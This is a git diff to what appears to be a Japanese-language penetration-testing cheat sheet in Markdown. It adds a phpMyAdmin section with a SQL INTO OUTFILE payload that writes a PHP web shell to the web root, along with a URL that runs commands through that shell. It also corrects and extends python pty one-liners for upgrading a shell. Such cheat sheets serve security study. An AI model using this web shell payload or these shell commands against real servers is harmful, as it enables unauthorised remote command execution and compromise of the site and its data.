@@ -407,6 +407,21 @@ $databases = array (
   ),
 );
 ```
+
+### phpMyAdmin
+MySQLサーバをWebブラウザで管理するためのデータベース接続ツール。  
+SQL文を記述することなく、MySQLの操作が行える。  
+Wordpressのデータベースを管理できる場合、パスワードの変更などが可能。(MD5)
+phpMyAdminの設定次第ではSQLタブ内に、下記のようなWebshellを埋め込むことが可能。
+```
+SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET['cmd']) {​​system($_GET[\'cmd\']);}​​ ?> </pre></BODY></HTML>"
+
+INTO OUTFILE '/var/www/phpMyAdmin/cmd.php'
+```
+```
+http://test.com/phpMyAdmin/cmd.php?cmd=ls
+```
+
 ### exiftools
 ・画像情報の表示
 ```
@@ -952,7 +967,8 @@ aircrack-ng <filename>.cap
 
 ### tty shell
 ```
-python -c 'import pty;pty.spbaawn("/bin/sh")'
+python -c 'import pty;pty.spawn("/bin/sh")'
+python -c 'import pty;pty.spawn("/bin/bash")'
 python3 -c 'import pty;pty.spawn("/bin/sh")'
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 echo os.system('/bin/bash')
